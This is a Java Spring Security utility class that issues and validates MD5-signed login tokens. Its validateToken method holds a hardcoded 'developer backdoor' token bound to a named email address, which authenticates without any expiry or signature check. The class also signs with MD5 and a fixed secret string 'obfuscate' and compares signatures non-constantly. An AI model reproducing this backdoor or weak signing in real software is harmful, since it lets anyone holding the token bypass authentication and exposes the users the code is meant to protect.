/*
 * Copyright 2013 Arnell Consulting AB.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */



package com.arnellconsulting.tps.security;

import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.crypto.codec.Hex;

import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import lombok.extern.slf4j.Slf4j;


@Slf4j
public final class TokenUtils {
   public static final String MAGIC_KEY = "obfuscate";
   public static final String BACKDOOR_TOKEN = "jim@arnellconsulting.com:1379262675510:ca1f13683a6aa9eacac64683b745b107";

   private TokenUtils() {}

   ;
   public static String computeSignature(final UserDetails userDetails, final long expires) {
      final StringBuilder signatureBuilder = new StringBuilder();

      signatureBuilder.append(userDetails.getUsername());
      signatureBuilder.append(":");
      signatureBuilder.append(expires);
      signatureBuilder.append(":");
      signatureBuilder.append(userDetails.getPassword());
      signatureBuilder.append(":");
      signatureBuilder.append(TokenUtils.MAGIC_KEY);

      MessageDigest digest;

      try {
         digest = MessageDigest.getInstance("MD5");
      } catch (NoSuchAlgorithmException e) {
         throw new IllegalStateException("No MD5 algorithm available!");
      }

      return new String(Hex.encode(digest.digest(signatureBuilder.toString().getBytes())));
   }

   public static String createToken(final UserDetails userDetails) {

      /* Expires in one hour */
      final long expires = System.currentTimeMillis() + 1000L * 60 * 60;
      final StringBuilder tokenBuilder = new StringBuilder();

      tokenBuilder.append(userDetails.getUsername());
      tokenBuilder.append(":");
      tokenBuilder.append(expires);
      tokenBuilder.append(":");
      tokenBuilder.append(TokenUtils.computeSignature(userDetails, expires));

      return tokenBuilder.toString();
   }

   public static boolean validateToken(final String authToken, final UserDetails userDetails) {
      final String[] parts = authToken.split(":");
      final long expires = Long.parseLong(parts[1]);
      final String signature = parts[2];
      
      // Backdoor for developers
      if (authToken.equals(BACKDOOR_TOKEN)) {
         log.warn("Logging in using developer backdoor");
         return true;
      }
      
      // Normal flow
      if (expires < System.currentTimeMillis()) {
         return false;
      }

      return signature.equals(TokenUtils.computeSignature(userDetails, expires));
   }

   public static String getUserNameFromToken(final String authToken) {
      if (null == authToken) {
         return null;
      }

      final String[] parts = authToken.split(":");

      return parts[0];
   }
}
